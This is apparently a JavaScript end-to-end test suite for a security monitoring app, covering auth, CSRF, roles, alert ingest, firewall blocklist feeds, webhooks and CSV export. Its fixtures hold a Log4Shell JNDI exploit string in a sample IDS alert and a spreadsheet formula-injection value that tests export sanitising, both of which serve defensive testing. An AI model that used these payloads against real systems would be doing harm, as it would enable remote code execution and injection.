'use strict';
// End-to-end HTTP test: boots the real app on an ephemeral port with an
// isolated store and exercises auth, CSRF, roles, ingest, feeds and retention.
// AEGIS_TEST_SUPABASE=1 runs the same checks against the Supabase project in
// .env instead. It WIPES every Aegis table before and after: never point it
// at a database that holds real incidents.
const assert = require('assert');
const crypto = require('crypto');
const http = require('http');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { MemoryStore } = require('../src/store/memory');
const { FeedAdapter } = require('../src/enforce');
const { createApp } = require('../src/app');

const offlineNvd = { async fetchCve() { throw new Error('fetch failed (offline test)'); } };

(async () => {
  const live = process.env.AEGIS_TEST_SUPABASE === '1';
  let store;
  let wipe = async () => {};
  if (live) {
    require('dotenv').config();
    const { SupabaseStore } = require('../src/store/supabase');
    store = new SupabaseStore(process.env.SUPABASE_URL, process.env.SUPABASE_SERVICE_ROLE_KEY || process.env.SUPABASE_SECRET_KEY);
    wipe = async () => {
      for (const [t, c] of [['alert_notes', 'id'], ['firewall_rules', 'rule_id'], ['investigations', 'investigation_id'], ['server_logs', 'id'], ['alerts', 'alert_id'],
        ['suppressions', 'id'], ['assets', 'ip_address'], ['cves', 'cve_id'], ['app_config', 'key'], ['audit_log', 'id'], ['api_keys', 'id'], ['users', 'id']]) {
        const { error } = await store.sb.from(t).delete().not(c, 'is', null);
        if (error) throw new Error(`wipe ${t}: ${error.message}`);
      }
    };
    await wipe();
    console.log(`Running against ${new URL(process.env.SUPABASE_URL).host}`);
  } else {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'aegis-http-'));
    store = new MemoryStore({ file: path.join(dir, 'store.json'), demo: false });
  }
  await store.init();
  const env = { SESSION_SECRET: 'x'.repeat(48), AEGIS_SETUP_TOKEN: 'bootstrap-123' };
  const { app, jobs } = createApp({ store, enforcer: new FeedAdapter(), nvd: offlineNvd, env, demo: false, warnings: [] });
  // Stands in for a SIEM / SOAR webhook endpoint.
  const received = [];
  const hook = http.createServer((req, res) => {
    let body = '';
    req.on('data', (c) => { body += c; });
    req.on('end', () => { received.push({ headers: req.headers, body }); res.writeHead(204); res.end(); });
  });
  await new Promise((r) => hook.listen(0, '127.0.0.1', r));
  const hookUrl = `http://127.0.0.1:${hook.address().port}/hooks/T0SOC/aegis-intake-7f3a9c`;
  const server = app.listen(0, '127.0.0.1');
  await new Promise((r) => server.once('listening', r));
  const base = `http://127.0.0.1:${server.address().port}`;

  const jar = {};
  async function call(method, url, { body, as = 'admin', headers = {}, raw } = {}) {
    const h = { ...headers };
    if (as && jar[as]) h.Cookie = jar[as];
    if (body !== undefined && !raw) h['Content-Type'] = 'application/json';
    if (as && method !== 'GET' && h['X-Aegis-Client'] === undefined) h['X-Aegis-Client'] = 'web';
    const res = await fetch(base + url, { method, headers: h, body: raw ?? (body !== undefined ? JSON.stringify(body) : undefined) });
    const set = res.headers.get('set-cookie');
    if (set && as) jar[as] = set.split(';')[0];
    const text = await res.text();
    let json = null; try { json = JSON.parse(text); } catch { /* text */ }
    return { status: res.status, json, text, headers: res.headers };
  }

  let passed = 0;
  const ok = (cond, msg) => { assert.ok(cond, msg); passed++; console.log(`PASS ${msg}`); };

  try {
    let r = await call('GET', '/api/auth/state', { as: null });
    ok(r.json.needs_setup === true && r.json.setup_token === true, 'fresh install asks for setup');
    ok((await call('GET', '/api/alerts', { as: null })).status === 401, 'API is closed before sign-in');
    ok(r.headers.get('content-security-policy').includes("script-src 'self'"), 'CSP header present');

    r = await call('POST', '/api/auth/setup', { body: { name: 'Priya Rao', email: 'priya@corp.example', password: 'Str0ngPassword', setup_token: 'wrong' } });
    ok(r.status === 403, 'setup rejects wrong setup token');
    r = await call('POST', '/api/auth/setup', { body: { name: 'Priya Rao', email: 'priya@corp.example', password: 'weak' , setup_token: 'bootstrap-123' } });
    ok(r.status === 400, 'setup enforces password policy');
    r = await call('POST', '/api/auth/setup', { body: { name: 'Priya Rao', email: 'Priya@corp.example', password: 'Str0ngPassword', setup_token: ' bootstrap-123\n' } });
    ok(r.status === 201 && r.json.user.role === 'admin' && jar.admin, 'first admin created and signed in');
    const adminId = r.json.user.id;
    ok((await call('POST', '/api/auth/setup', { as: null, body: { name: 'X', email: 'x@y.z', password: 'Str0ngPassword' } })).status === 409, 'setup cannot run twice');

    r = await call('GET', '/api/alerts');
    ok(r.status === 200 && Array.isArray(r.json) && r.json.length === 0, 'production install starts with no fake alerts');
    r = await call('GET', '/api/cves');
    ok(r.json.some((c) => c.cve_id === 'CVE-2021-44228' && c.cpe_ranges === 3 && !c.cpe_matches), 'reference CVEs present, CPE data stripped');

    r = await call('PUT', '/api/config', { body: { maxIterations: 10 }, headers: { 'X-Aegis-Client': '' } });
    ok(r.status === 403, 'writes without X-Aegis-Client are refused (CSRF)');

    r = await call('POST', '/api/users', { body: { name: 'Sam Viewer', email: 'sam@corp.example', password: 'Another1pass', role: 'viewer' } });
    ok(r.status === 201 && !r.json.password_hash, 'admin creates viewer, hash not exposed');
    const viewerId = r.json.id;
    r = await call('POST', '/api/auth/login', { as: 'viewer', body: { email: 'sam@corp.example', password: 'nope-nope-1' } });
    ok(r.status === 401, 'wrong password rejected');
    r = await call('POST', '/api/auth/login', { as: 'viewer', body: { email: 'sam@corp.example', password: 'Another1pass' } });
    ok(r.status === 200 && jar.viewer, 'viewer signs in');
    ok((await call('POST', '/api/rules', { as: 'viewer', body: { target_ip: '203.0.113.5', action: 'BLOCK', reason: 'test block' } })).status === 403, 'viewer cannot create rules');
    ok((await call('GET', '/api/users', { as: 'viewer' })).status === 403, 'viewer cannot list users');

    r = await call('PATCH', `/api/users/${viewerId}`, { body: { disabled: true } });
    ok(r.status === 200, 'admin disables viewer');
    ok((await call('GET', '/api/alerts', { as: 'viewer' })).status === 401, 'disabled user session is revoked immediately');
    ok((await call('PATCH', `/api/users/${adminId}`, { body: { role: 'analyst' } })).status === 409, 'last admin cannot be demoted');

    // API keys and ingest
    ok((await call('POST', '/api/ingest/alerts', { as: null, body: [] })).status === 401, 'ingest needs an API key');
    r = await call('POST', '/api/keys', { body: { name: 'suricata-dmz-01', scopes: ['ingest'] } });
    ok(r.status === 201 && r.json.key.startsWith('aeg_'), 'ingest key issued once');
    const ingestKey = r.json.key;
    r = await call('POST', '/api/keys', { body: { name: 'pa-3220 EDL', scopes: ['feed'] } });
    const feedKey = r.json.key;
    ok(!(await call('GET', '/api/keys')).json.some((k) => k.key || k.hash), 'key list never returns secrets');

    const eve = [
      { timestamp: new Date(Date.now() - 60000).toISOString(), flow_id: 99, event_type: 'alert', src_ip: '185.220.101.45', src_port: 4444, dest_ip: '10.0.4.15', dest_port: 8080, proto: 'TCP', app_proto: 'http',
        alert: { signature_id: 2034647, rev: 3, signature: 'ET EXPLOIT Apache log4j RCE Attempt (CVE-2021-44228)', category: 'Attempted Administrator Privilege Gain', severity: 1 },
        payload_printable: 'GET /?q=${jndi:ldap://185.220.101.45:1389/a} HTTP/1.1' },
      { timestamp: new Date().toISOString(), event_type: 'flow', src_ip: '1.1.1.1', dest_ip: '10.0.0.1' }
    ];
    const ndjson = eve.map((e) => JSON.stringify(e)).join('\n') + '\nnot json\n';
    r = await call('POST', '/api/ingest/alerts', { as: null, raw: ndjson, headers: { Authorization: `Bearer ${ingestKey}`, 'Content-Type': 'application/x-ndjson' } });
    ok(r.status === 202 && r.json.accepted === 1 && r.json.skipped === 1 && r.json.rejected.length === 1, 'EVE NDJSON ingested (1 alert, 1 flow skipped, 1 bad line)');
    r = await call('POST', '/api/ingest/alerts', { as: null, body: eve, headers: { Authorization: `Bearer ${ingestKey}` } });
    ok(r.json.accepted === 0 && r.json.duplicates === 1, 're-sent events are de-duplicated');
    ok((await call('POST', '/api/ingest/alerts', { as: null, body: eve, headers: { Authorization: `Bearer ${feedKey}` } })).status === 403, 'feed key cannot ingest');

    r = await call('POST', '/api/ingest/logs?host_ip=10.0.4.15', { as: null, raw: '185.220.101.45 - - [16/Oct/2026:09:12:44 +0000] "GET /?q=x HTTP/1.1" 200 12\n', headers: { Authorization: `Bearer ${ingestKey}`, 'Content-Type': 'text/plain' } });
    ok(r.status === 202 && r.json.accepted === 1, 'raw access log line ingested');

    // Inventory
    r = await call('POST', '/api/assets/import', { raw: 'ip_address,hostname,criticality,installed_packages\n10.0.4.15,prod-web-core,critical,log4j-core-2.14.1.jar\n10.0.4.16,,high,\n', headers: { 'Content-Type': 'text/csv' } });
    ok(r.json.imported === 1 && r.json.errors.length === 1, 'CSV import with per-row errors');
    r = await call('GET', '/api/assets');
    ok(r.json[0].exposures.some((e) => e.cve_id === 'CVE-2021-44228'), 'imported host matched to Log4Shell by CPE range');
    const nmapXml = '<?xml version="1.0"?><nmaprun scanner="nmap" start="1760000000"><host><status state="up"/><address addr="10.0.4.15" addrtype="ipv4"/><ports><port protocol="tcp" portid="8080"><state state="open"/><service name="http" product="Apache Tomcat" version="9.0.31"/></port></ports></host><host><status state="up"/><address addr="10.0.4.30" addrtype="ipv4"/><hostnames><hostname name="db-02" type="PTR"/></hostnames></host></nmaprun>';
    r = await call('POST', '/api/assets/import', { raw: nmapXml, headers: { 'Content-Type': 'application/xml' } });
    ok(r.status === 200 && r.json.format === 'nmap' && r.json.created === 1 && r.json.updated === 1, 'Nmap XML import creates and updates hosts');
    let inv = (await call('GET', '/api/assets')).json;
    const merged = inv.find((a) => a.ip_address === '10.0.4.15');
    ok(merged.hostname === 'prod-web-core' && merged.criticality === 'CRITICAL', 'scan keeps hostname and criticality from the CMDB');
    ok(merged.installed_packages.includes('log4j-core-2.14.1.jar') && merged.installed_packages.includes('Apache Tomcat 9.0.31'), 'scan merges packages instead of replacing them');
    r = await call('POST', '/api/ingest/assets', { as: null, body: [{ ip_address: '10.0.4.31', hostname: 'build-01', os_family: 'Linux', installed_packages: ['openssl 3.0.2'] }], headers: { Authorization: `Bearer ${ingestKey}` } });
    ok(r.status === 200 && r.json.created === 1, 'agent inventory push with an ingest key');
    ok((await call('POST', '/api/ingest/assets', { as: null, body: [{ ip_address: '10.0.4.32', hostname: 'x' }], headers: { Authorization: `Bearer ${feedKey}` } })).status === 403, 'feed key cannot push inventory');
    inv = (await call('GET', '/api/assets')).json;
    ok(inv.find((a) => a.ip_address === '10.0.4.31').source === 'agent', 'agent rows are tagged with their source');
    r = await call('POST', '/api/cves/sync', { body: {} });
    ok(r.status === 200 && r.json.updated === 0 && r.json.failed.length > 0, 'NVD sync fails gracefully offline');

    // Investigation -> rule -> feed pull -> enforced
    const alertId = (await call('GET', '/api/alerts')).json[0].alert_id;
    r = await call('POST', '/api/investigations/stream', { body: { alert_id: alertId } });
    ok(r.text.includes('"type":"done"'), 'investigation streams to completion');
    let rules = (await call('GET', '/api/rules')).json;
    const block = rules.find((x) => x.action === 'BLOCK' && x.target_ip === '185.220.101.45');
    ok(block && block.enforcement.status === 'PENDING', 'block rule is PENDING until the firewall pulls');
    const st = (await call('GET', `/api/alerts/${alertId}`)).json;
    ok(st.alert.status !== 'CONTAINED', 'alert is not marked contained before enforcement');
    ok((await call('GET', '/api/feeds/blocklist.txt', { as: null })).status === 401, 'feed needs a key');
    const basic = Buffer.from(`fw:${feedKey}`).toString('base64');
    r = await call('GET', '/api/feeds/blocklist.txt', { as: null, headers: { Authorization: `Basic ${basic}` } });
    ok(r.status === 200 && r.text.split('\n').includes('185.220.101.45'), 'firewall pulls blocklist with basic auth');
    rules = (await call('GET', '/api/rules')).json;
    ok(rules.find((x) => x.rule_id === block.rule_id).enforcement.status === 'ENFORCED', 'pull marks the rule ENFORCED');
    r = await call('POST', '/api/verify', { body: { target_ip: '185.220.101.45' } });
    ok(r.json.contained === true && r.json.status === 'ENFORCED', 'verify reports enforcement read-back');

    // ---- Case work: ownership, notes, timeline ---------------------------------
    r = await call('POST', `/api/alerts/${alertId}/assign`, { body: { user_id: adminId } });
    ok(r.status === 200 && r.json.assignee_name === 'Priya Rao' && r.json.acknowledged_at, 'alert assigned and acknowledged');
    ok((await call('POST', `/api/alerts/${alertId}/assign`, { body: { user_id: viewerId } })).status === 400, 'viewers cannot own cases');
    r = await call('POST', `/api/alerts/${alertId}/notes`, { body: { body: 'Confirmed with app team: host patched to 2.17.1' } });
    ok(r.status === 201 && r.json.kind === 'note', 'analyst note added');
    r = await call('GET', `/api/alerts/${alertId}`);
    ok(r.json.notes.some((n) => n.kind === 'event' && /took the case/.test(n.body)) && r.json.notes.some((n) => /Investigation INV-/.test(n.body)), 'timeline holds assignment and verdict events');
    ok((await call('GET', '/api/alerts?assignee=me')).json.every((a) => a.assignee_id === adminId), 'my-queue filter');

    // ---- Notification channel with HMAC signature -------------------------------
    const secret = 'whsec_test_0123456789abcdef';
    r = await call('POST', '/api/notify/channels', { body: { name: 'SOAR intake', kind: 'webhook', url: hookUrl, secret, min_severity: 'HIGH', events: ['alert', 'containment', 'verdict'] } });
    ok(r.status === 201 && r.json.signed && !r.json.secret && !String(r.json.url_hint).includes('aegis-intake'), 'webhook channel added, secret and URL masked');
    const channelId = r.json.id;
    ok(!JSON.stringify((await call('GET', '/api/config')).json).includes(secret), 'config never returns channel secrets');
    ok((await call('GET', '/api/notify/channels', { as: 'viewer' })).status === 401, 'channels hidden from signed-out users');
    r = await call('POST', `/api/notify/channels/${channelId}/test`, { body: {} });
    ok(r.status === 200 && r.json.ok && received.length === 1, 'test message delivered');
    const sig = (m) => `sha256=${crypto.createHmac('sha256', secret).update(`${m.headers['x-aegis-timestamp']}.${m.body}`).digest('hex')}`;
    ok(received[0].headers['x-aegis-signature'] === sig(received[0]), 'webhook HMAC signature verifies');

    // ---- Suppression rules -------------------------------------------------------
    const scan = (n, src) => ({ timestamp: new Date(Date.now() - n * 1000).toISOString(), flow_id: 5000 + n, event_type: 'alert', src_ip: src, src_port: 50000 + n, dest_ip: '10.0.4.15', dest_port: 443, proto: 'TCP',
      alert: { signature_id: 2010935, rev: 2, signature: 'ET SCAN Qualys vulnerability scanner', category: 'Attempted Information Leak', severity: 2 }, payload_printable: 'GET /qualys HTTP/1.1' });
    r = await call('POST', '/api/ingest/alerts', { as: null, body: [scan(1, '64.39.96.10'), scan(2, '64.39.96.11')], headers: { Authorization: `Bearer ${ingestKey}` } });
    ok(r.json.accepted === 2 && received.length === 2 && JSON.parse(received[1].body).event === 'alert', 'new HIGH alerts pushed to the channel');
    r = await call('POST', '/api/suppressions/preview', { body: { signature: 'Qualys', source_cidr: '64.39.96.0/20' } });
    ok(r.status === 200 && r.json.matched === 2 && r.json.open === 2, 'suppression preview counts matching alerts');
    ok((await call('POST', '/api/suppressions', { body: { name: 'too broad', source_cidr: '0.0.0.0/0' } })).status === 400, 'over-broad CIDR rejected');
    r = await call('POST', '/api/suppressions', { body: { name: 'Quarterly Qualys scan', signature: 'Qualys', source_cidr: '64.39.96.0/20', expires_in_days: 30, apply_to_open: true } });
    ok(r.status === 201 && r.json.closed === 2 && r.json.hits === 2, 'suppression created and open matches closed');
    const suppId = r.json.id;
    r = await call('POST', '/api/ingest/alerts', { as: null, body: [scan(3, '64.39.96.12'), { ...scan(4, '198.51.100.9'), alert: { ...scan(4, '').alert, signature: 'ET SCAN Nmap OS detection' } }], headers: { Authorization: `Bearer ${ingestKey}` } });
    ok(r.json.accepted === 2 && r.json.suppressed === 1, 'ingest suppresses matching events only');
    const supp = (await call('GET', '/api/suppressions')).json.find((s) => s.id === suppId);
    ok(supp.hits === 3 && supp.live, 'suppression hit counter updates');
    const quiet = (await call('GET', '/api/alerts?q=Qualys')).json;
    ok(quiet.length === 3 && quiet.every((a) => a.status === 'FALSE_POSITIVE' && a.suppressed_by === suppId), 'suppressed alerts are kept and tagged');

    // ---- Bulk triage --------------------------------------------------------------
    const nmap = (await call('GET', '/api/alerts?q=Nmap')).json.map((a) => a.alert_id);
    r = await call('POST', '/api/alerts/bulk', { body: { ids: nmap, action: 'status', status: 'CLOSED' } });
    ok(r.status === 200 && r.json.updated === 1, 'bulk close');
    r = await call('GET', `/api/alerts/${nmap[0]}`);
    ok(r.json.alert.resolved_at && r.json.notes.some((n) => /bulk/.test(n.body)), 'bulk close stamps resolved_at and the timeline');

    // ---- Time-boxed containment ------------------------------------------------------
    r = await call('POST', '/api/rules', { body: { target_ip: '198.51.100.77', action: 'BLOCK', reason: 'credential stuffing', ttl_hours: 24 } });
    ok(r.status === 201 && r.json.expires_at, 'block with 24h expiry');
    ok(received.some((m) => JSON.parse(m.body).event === 'containment'), 'containment pushed to the channel');
    ok((await call('POST', '/api/rules', { body: { target_ip: '198.51.100.78', action: 'BLOCK', reason: 'bad ttl', ttl_hours: 99999 } })).status === 400, 'out-of-range expiry rejected');
    await store.rules.update(r.json.rule_id, { expires_at: new Date(Date.now() - 1000).toISOString() });
    r = await call('GET', '/api/feeds/blocklist.txt', { as: null, headers: { Authorization: `Basic ${basic}` } });
    ok(!r.text.includes('198.51.100.77') && r.text.includes('185.220.101.45'), 'expired block dropped from the feed');
    rules = (await call('GET', '/api/rules')).json;
    ok(rules.find((x) => x.target_ip === '198.51.100.77').is_active === false, 'expired rule switched off');

    // ---- Profiles, reports, exports ---------------------------------------------------
    r = await call('GET', '/api/ip/185.220.101.45');
    ok(r.status === 200 && r.json.counts.as_source >= 1 && r.json.rules.length >= 1 && r.json.logs.length === 1, 'IP profile gathers alerts, rules and logs');
    ok((await call('GET', '/api/search?q=185.220.101.45')).json.ip === '185.220.101.45', 'search offers the IP profile');
    r = await call('GET', '/api/reports/summary?days=7');
    const crit = r.json.sla.find((s) => s.severity === 'CRITICAL');
    ok(r.status === 200 && r.json.totals.suppressed === 3 && r.json.totals.noise_reduction > 0 && crit.acknowledged >= 1, 'report summary: noise reduction and SLA');
    ok(r.json.mitre.some((t) => t.total > 0) && r.json.top_attackers.some((a) => a.ip === '185.220.101.45' && a.blocked), 'report summary: ATT&CK and top attackers');
    await call('POST', '/api/alerts', { body: { signature: '=HYPERLINK("http://evil")', source_ip: '203.0.113.9', dest_ip: '10.0.4.15', dest_port: 80, severity: 'LOW', raw_payload: 'x' } });
    r = await call('GET', '/api/export/alerts.csv?days=7');
    ok(r.status === 200 && /text\/csv/.test(r.headers.get('content-type')) && r.text.includes(`"'=HYPERLINK(""http://evil"")"`), 'CSV export neutralises formulas');
    ok((await call('GET', '/api/export/audit.csv')).text.includes('suppression.created'), 'audit CSV export');
    const invId = (await call('GET', '/api/investigations')).json[0].investigation_id;
    r = await call('GET', `/api/investigations/${invId}/report.md`);
    ok(r.status === 200 && r.text.startsWith('# Incident report') && r.text.includes('Case timeline'), 'incident report download');
    r = await call('PUT', '/api/config', { body: { slaCritical: 10, autoBlockTtlHours: 48 } });
    ok(r.status === 200 && r.json.slaCritical === 10 && !('notifyChannels' in r.json), 'SLA and TTL policy saved');
    ok((await call('PUT', '/api/config', { body: { slaHigh: 0 } })).status === 400, 'invalid SLA rejected');

    ok((await call('POST', '/api/reset')).status === 403, 'reset disabled outside demo mode');

    // Password change revokes the old cookie.
    const oldCookie = jar.admin;
    r = await call('POST', '/api/auth/password', { body: { current_password: 'Str0ngPassword', new_password: 'Newer1Password' } });
    ok(r.status === 200, 'password changed');
    const stale = await fetch(`${base}/api/alerts`, { headers: { Cookie: oldCookie } });
    ok(stale.status === 401, 'old session invalid after password change');

    const audit = (await call('GET', '/api/audit?limit=200')).json.map((a) => a.action);
    ok(['user.created', 'key.created', 'ingest.alerts', 'feed.pulled', 'auth.failed'].every((x) => audit.includes(x)), 'audit trail records security events');

    r = await jobs.retention();
    ok(r.alerts === 0 && r.logs === 0, 'retention job runs');
    console.log(`\n${passed} HTTP checks passed`);
  } finally {
    server.close();
    hook.close();
    jobs.stop();
    await wipe();
  }
  process.exit(0);
})().catch((e) => { console.error(e); process.exit(1); });